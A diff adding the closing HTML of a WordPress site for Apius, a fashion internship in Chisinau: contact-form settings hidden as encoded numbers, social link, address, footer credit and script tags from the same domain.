+			<div class="ff-contact-info" style="display:none;">5141,5052,5119,5127,5115,5123,5126,5052,5076,5052,5127,5123,5122,5115,5123,5082,5120,5123,5136,5119,5134,5128,5064,5117,5129,5127,5052,5062,5052,5133,5135,5116,5124,5119,5117,5134,5052,5076,5052,5085,5129,5128,5134,5115,5117,5134,5050,5120,5129,5132,5127,5050,5083,5130,5123,5135,5133,5052,5143</div><div class="ff-contact-forgot-message" style="display:none;">Ai uitat sa introduci %s</div>		</div>
+		<!-- End Contact Form Area -->
+	</div>
+	<!-- End Inner -->
+</section>
+<!-- End Contact Section -->
+<!-- Site Socials and Address -->
+<section id="site-socials" class="no-padding has-bg">
+	<div class="site-socials inner no-padding">
+		<!-- Socials -->
+		<div class="socials">
+			<a href="https://www.facebook.com/APIUS-Fashion-Internship-1667692643444757/timeline" target="_blank" class="social"><i class="ff-font-awesome icon-facebook-squared icon-facebook"></i></a> 		</div>
+		<!-- Adress, Mail -->
+		<div class="address ">
+		 	<p>0567 - 123 - 456 & <a href="mailto:contact@apius.md" class="bold dark">contact@apius.md</a></p>
+<p>1234 Street Name, <span class="bold colored">Chisinau</span></p>
+			<a href="#home" class="scroll top-button">
+			<i class="ff-font-awesome icon-angle-double-up"></i>
+			</a>
+		</div>
+		<!-- End Adress, Mail -->
+	</div>
+	<!-- End Inner -->
+</section>
+<!-- End Site Socials and Address -->		
+	<!-- Footer -->
+	<footer class="footer">
+		<!-- Your Company Name -->
+		<h2 class="company-name condensed uppercase white bold">Apius</h2>
+		<!-- Copyright -->
+		<p class="copyright normal">&copy; 2016 Apius. Created by <a href="http://www.fivetn-development.ro/" target="_blank" class="white">Fivetn Development</a></p>
+	</footer><!-- End Footer -->	<script type='text/javascript' src='http://apius.md/wp-includes/js/wp-embed.min.js?ver=4.7.10'></script>
+<script type='text/javascript' src='http://apius.md/wp-content/uploads/freshframework/assetsmin/779d5c41873529c14f631ae654004589.js'></script>
+</body>
+
+</html>
